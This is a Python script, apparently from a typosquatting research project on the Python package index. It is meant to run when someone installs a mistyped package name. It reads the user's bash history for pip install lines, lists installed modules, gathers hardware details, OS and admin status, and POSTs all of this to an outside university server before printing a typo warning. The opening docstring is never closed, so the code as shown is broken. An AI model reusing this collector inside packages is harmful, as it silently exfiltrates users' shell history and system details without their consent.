#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Notification program used in the typo squatting
bachelor thesis for the python package index.

Synced in May 2024
Blacksnow Martin

import os
import ctypes
import sys
import platform
import subprocess

debug = False

# we are using Python3
if sys.version_info[0] == 3:
  import urllib.request
  from urllib.parse import urlencode

  GET = urllib.request.urlopen

  def python3POST(url, data={}, headers=None):
    """
    Returns the response of the POST request as string or
    False if the resource could not be accessed.
    """
    data = urllib.parse.urlencode(data).encode()
    request = urllib.request.Request(url, data)
    try:
      reponse = urllib.request.urlopen(request, timeout=15)
      cs = reponse.headers.get_content_charset()
      if cs:
        return reponse.read().decode(cs)
      else:
        return reponse.read().decode('utf-8')
    except urllib.error.HTTPError as he:
      # try again if some 400 or 500 error was received
      return ''
    except Exception as e:
      # everything else fails
      return False
  POST = python3POST
# we are using Python2
else:
  import urllib2
  from urllib import urlencode
  GET = urllib2.urlopen
  def python2POST(url, data={}, headers=None):
    """
    See python3POST
    """
    req = urllib2.Request(url, urlencode(data))
    try:
      response = urllib2.urlopen(req, timeout=15)
      return response.read()
    except urllib2.HTTPError as he:
      return ''
    except Exception as e:
      return False
  POST = python2POST


try:
  from subprocess import DEVNULL # py3k
except ImportError:
  DEVNULL = open(os.devnull, 'wb')


def get_command_history():
  if os.name == 'nt':
    # handle windows
    # http://serverfault.com/questions/95404/
    #is-there-a-global-persistent-cmd-history
    # apparently, there is no history in windows :(
    return ''

  elif os.name == 'posix':
    # handle linux and mac
    cmd = 'cat {}/.bash_history | grep -E "pip[23]? install"'
    return os.popen(cmd.format(os.path.expanduser('~'))).read()


def get_hardware_info():
  if os.name == 'nt':
    # handle windows
    return platform.processor()

  elif os.name == 'posix':
    # handle linux and mac
    if sys.platform.startswith('linux'):
      try:
        hw_info = subprocess.check_output('lshw -short',
                   stderr=DEVNULL, shell=True)
      except:
        hw_info = ''

      if not hw_info:
        try:
          hw_info = subprocess.check_output('lspci',
                   stderr=DEVNULL, shell=True)
        except:
          hw_info = ''
        hw_info += '\n' +\
          os.popen('free -m').read().strip()

      return hw_info

    elif sys.platform == 'darwin':
      # According to https://developer.apple.com/library/
      # mac/documentation/Darwin/Reference/ManPages/
      # man8/system_profiler.8.html
      # no personal information is provided by detailLevel: mini
      return os.popen('system_profiler -detailLevel mini').read()


def get_all_installed_modules():
  # first try the default path
  pip_list = os.popen('pip list').read().strip()

  if pip_list:
    return pip_list
  else:
    if os.name == 'nt':
      paths = ('C:/Python27',
           'C:/Python34',
           'C:/Python26',
           'C:/Python33',
           'C:/Python35',
           'C:/Python',
           'C:/Python2',
           'C:/Python3')
      # try some paths that make sense to me
      for loc in paths:
        pip_location = os.path.join(loc, 'Scripts/pip.exe')
        if os.path.exists(pip_location):
          cmd = '{} list'.format(pip_location)
          try:
            pip_list = subprocess.check_output(cmd,
                   stderr=DEVNULL, shell=True)
          except:
            pip_list = ''
          if pip_list:
            return pip_list
  return ''


def notify_home(url, package_name, intended_package_name):
  host_os = platform.platform()
  try:
    admin_rights = bool(os.getuid() == 0)
  except AttributeError:
    try:
      ret = ctypes.windll.shell32.IsUserAnAdmin()
      admin_rights = bool(ret != 0)
    except:
      admin_rights = False

  if os.name != 'nt':
    try:
      pip_version = os.popen('pip --version').read()
    except:
      pip_version = ''
  else:
    pip_version = platform.python_version()

  url_data = {
    'p1': package_name,
    'p2': intended_package_name,
    'p3': 'pip',
    'p4': host_os,
    'p5': admin_rights,
    'p6': pip_version,
  }

  post_data = {
    'p7': get_command_history(),
    'p8': get_all_installed_modules(),
    'p9': get_hardware_info(),
  }

  url_data = urlencode(url_data)
  response = POST(url + url_data, post_data)

  if debug:
    print(response)

  print('')
  print("Warning!!! Maybe you made a typo in your installation\
   command or the module does only exist in the python stdlib?!")
  print("Did you want to install '{}'\
   instead of '{}'??!".format(intended_package_name, package_name))
  print('For more information, please\
   visit http://svs-repo.informatik.uni-hamburg.de/')


def main():
  if debug:
    notify_home('http://localhost:8000/app/?',
             'pmba_basic', 'pmba_basic')
  else:
    notify_home('http://svs-repo.informatik.uni-hamburg.de/app/?',
                     'pmba_basic', 'pmba_basic')

if __name__ == '__main__':
  main()
